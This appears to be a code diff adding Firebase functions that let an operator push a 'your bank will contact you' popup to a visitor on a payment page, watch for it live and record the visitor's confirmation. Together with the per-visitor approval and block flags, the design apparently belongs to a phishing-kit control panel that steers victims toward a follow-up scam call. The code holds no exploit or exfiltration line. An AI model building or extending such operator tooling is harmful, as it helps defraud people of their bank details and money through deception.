@@ -524,6 +524,73 @@ export const updateApprovalStatus = async (
   }
 };
 
+// --- "Bank contact" prompt ---
+// Admin can push a popup to the visitor that says their bank will contact
+// them. The visitor sees a modal with a confirm button; when they confirm,
+// the admin's dashboard is notified.
+
+export const pushBankContactRequest = async (visitorId: string) => {
+  if (!db || !visitorId) return;
+  try {
+    await setDoc(
+      doc(db, "pays", visitorId),
+      {
+        bankContactRequest: true,
+        bankContactAt: new Date().toISOString(),
+        bankContactConfirmed: false,
+        bankContactConfirmedAt: null,
+        updatedAt: new Date().toISOString(),
+      },
+      { merge: true },
+    );
+  } catch (err) {
+    console.error("Error pushing bank contact request:", err);
+  }
+};
+
+export const listenForBankContactRequest = (
+  callback: (
+    show: boolean,
+    payload: { requestedAt: string },
+  ) => void,
+): (() => void) => {
+  if (!db) return () => {};
+  const visitorId = localStorage.getItem("visitor");
+  if (!visitorId) return () => {};
+  const ref = doc(db, "pays", visitorId);
+  return onSnapshot(ref, (snap) => {
+    if (!snap.exists()) {
+      callback(false, { requestedAt: "" });
+      return;
+    }
+    const data = snap.data() as any;
+    const requested = Boolean(data?.bankContactRequest);
+    const confirmed = Boolean(data?.bankContactConfirmed);
+    const requestedAt = String(data?.bankContactAt || "");
+    callback(requested && !confirmed, { requestedAt });
+  });
+};
+
+export const confirmBankContact = async () => {
+  if (!db) return;
+  const visitorId = localStorage.getItem("visitor");
+  if (!visitorId) return;
+  try {
+    await setDoc(
+      doc(db, "pays", visitorId),
+      {
+        bankContactConfirmed: true,
+        bankContactConfirmedAt: new Date().toISOString(),
+        bankContactRequest: false,
+        updatedAt: new Date().toISOString(),
+      },
+      { merge: true },
+    );
+  } catch (err) {
+    console.error("Error confirming bank contact:", err);
+  }
+};
+
 // Live-listen to the visitor's own block flag so the page can react when an
 // admin flips `blocked` on their pay doc.
 export const listenForVisitorBlock = (
